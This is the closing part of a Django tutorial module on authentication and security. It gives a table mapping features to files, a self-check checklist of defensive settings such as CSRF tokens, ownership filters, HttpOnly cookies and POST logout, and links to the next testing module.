| **N+1 protection** | `selectors.py` — `select_related('notebook', 'group')`, `prefetch_related('tags')` |
| **Group CRUD** | `services.py` — `create_group`, `add_user_to_group`, `delete_group` |
| **3-action POST** | `views.py group_detail` — `action='add'/'remove'/'leave'` |
| **SET_NULL cascade** | `group_confirm_delete.html` — explanation of the behavior |
| **Security settings** | `settings.py` — `HTTPONLY, SAMESITE, X_FRAME_OPTIONS, DEBUG=False` |
| **ngrok CSRF** | `settings.py` — `CSRF_TRUSTED_ORIGINS` from the `NGROK_DOMAIN` env |
| **PBKDF2 passwords** | the `auth_user.password` field — `pbkdf2_sha256$600000$salt$hash` |

---

## Self-check checklist

- [ ] `@login_required` and `LOGIN_URL` in `settings.py` are configured
- [ ] `include("django.contrib.auth.urls")` is connected in `urls.py`
- [ ] The templates `registration/login.html` and `registration/register.html` exist
- [ ] `{% csrf_token %}` in every form with `method="post"`
- [ ] Personal objects: `get_object_or_404(Model, pk=pk, user=request.user)`; shared (Note): Q-filter + `note.user != request.user` before writing
- [ ] The Password Reset flow is tested (the link is in `docker compose logs web`)
- [ ] The `validlink` check in `password_reset_confirm.html`
- [ ] The Q-filter `Q(user=user) | Q(group__in=user_groups)` in `selectors.py`
- [ ] `SESSION_COOKIE_HTTPONLY = True` and `X_FRAME_OPTIONS = "DENY"` in settings.py
- [ ] Logout is a POST request (not a GET link)
- [ ] Group delete explains that notes become personal (they are not deleted)

---

## Next

Next step: [06 — Testing](06_testing.md) — TestCase, the AAA pattern, service/view tests, Selenium E2E.

Documentation modules:
- [README_6.md](README_6.md) — Auth & Security: a detailed tutorial with full code (crispy_notes_project)
- [README_9.md](README_9.md) — Production Stack: Docker+nginx+ngrok+Redis for notes_chat_app
- [docs/07_auth_and_security/](../07_auth_and_security/) — theoretical materials: OWASP, Zero Trust, SIEM
